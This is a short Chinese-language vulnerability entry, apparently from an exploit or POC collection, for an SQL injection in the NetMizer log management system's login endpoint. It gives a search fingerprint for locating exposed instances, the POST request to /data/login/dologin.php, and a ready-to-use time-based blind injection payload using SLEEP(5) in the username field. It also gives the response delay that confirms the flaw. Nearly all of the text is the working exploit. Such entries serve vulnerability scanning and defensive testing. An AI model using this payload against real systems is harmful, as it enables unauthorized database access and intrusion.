# NetMizer日志管理系统dologin存在SQL注入漏洞

NetMizer ｜ SQL注入 ｜ —
- **指纹**：`title="NetMizer 日志管理系统"`
- **请求**：`POST /data/login/dologin.php HTTP/1.1`

**Payload**
```
action=login&username=' AND (SELECT 6909 FROM (SELECT(SLEEP(5)))oNyW) AND 'EVSj'='EVSj&passwd=admin
```
- **响应特征**：200 响应时间>=5s